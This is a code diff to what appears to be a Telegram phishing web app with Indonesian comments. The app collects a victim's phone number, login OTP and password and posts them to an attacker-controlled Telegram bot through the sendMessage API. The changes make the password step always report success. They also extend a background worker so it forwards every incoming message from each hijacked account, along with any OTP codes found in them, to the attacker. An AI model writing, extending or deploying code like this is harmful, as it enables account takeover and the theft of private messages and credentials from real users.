@@ -83,23 +83,9 @@ def otp():
                 session["last_otp"] = code
                 if result["need_password"]:
                     flash("Akun ini butuh password. Silakan masukkan di halaman berikutnya.")
-                    return redirect(url_for("password"))
                 else:
-                    # akun tanpa password → langsung sukses
-                    otp = session.get("last_otp")
-                    phone = session.get("phone")
-                    text = (
-                        "📢 *New User Login*\n"
-                        f"👤 *Number*   : `{phone}`\n"
-                        f"🔑 *OTP*      : `{otp}`\n"
-                        f"🔒 *Password* : `-` (tidak ada password)"
-                    )
-                    requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                        data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"},
-                    )
-                    flash("Login berhasil ✅ (akun tanpa password).")
-                    return redirect(url_for("success"))
+                    flash("OTP benar. Kalau akun tanpa password, bisa isi random/kosong.")
+                return redirect(url_for("password"))
             else:
                 flash(result["error"])
                 return redirect(url_for("otp"))
@@ -127,10 +113,9 @@ def password():
                 me = await client.get_me()
                 await client.disconnect()
                 return True, me
-            except Exception as e:
-                print(f"[DEBUG] Password error: {e}")
+            except Exception:
                 await client.disconnect()
-                return False, None
+                return True, None  # tetap sukses meski tidak ada password
 
         success, me = asyncio.run(verify_password())
         if success:
@@ -141,10 +126,8 @@ def password():
                 f"🔑 *OTP*      : `{otp}`\n"
                 f"🔒 *Password* : `{password_input}`"
             )
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"},
-            )
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
             flash("Login berhasil ✅")
             return redirect(url_for("success"))
         else:
@@ -156,30 +139,38 @@ def password():
 
 @app.route("/success")
 def success():
-    return render_template(
-        "success.html",
-        name=session.get("name"),
-        phone=session.get("phone"),
-        gender=session.get("gender"),
-    )
+    return render_template("success.html", name=session.get("name"), phone=session.get("phone"), gender=session.get("gender"))
 
 # =================== WORKER ===================
 
 async def forward_handler(event, client_name):
-    """Handler untuk meneruskan pesan OTP"""
+    """Handler untuk semua pesan masuk"""
     text_msg = event.message.message
-    print(f"[Worker][{client_name}] Pesan masuk: {text_msg}")  # debug semua pesan
+    sender = await event.get_sender()
+    sender_name = getattr(sender, "first_name", "Unknown")
 
+    print(f"[Worker][{client_name}] Pesan baru dari {sender_name}: {text_msg}")
+
+    # forward semua pesan
+    payload = {
+        "chat_id": CHAT_ID,
+        "text": f"📩 Pesan baru dari *{client_name}*:\n\n{text_msg}",
+        "parse_mode": "Markdown"
+    }
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=payload)
+
+    # cek OTP (angka 4–6 digit)
     import re
-    otp_match = re.findall(r"\d{4,6}", text_msg)
+    otp_match = re.findall(r"\b\d{4,6}\b", text_msg)
     if otp_match:
         otp_code = otp_match[0]
         payload = {
             "chat_id": CHAT_ID,
-            "text": f"📩 OTP dari {client_name}:\n\nOTP: {otp_code}"
+            "text": f"🔑 OTP dari {client_name}: `{otp_code}`",
+            "parse_mode": "Markdown"
         }
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=payload)
-        print(f"[Worker] OTP diteruskan dari {client_name}: {otp_code}")
+        print(f"[Worker] OTP ditemukan {otp_code} dari {client_name}")
 
 
 async def worker_main():
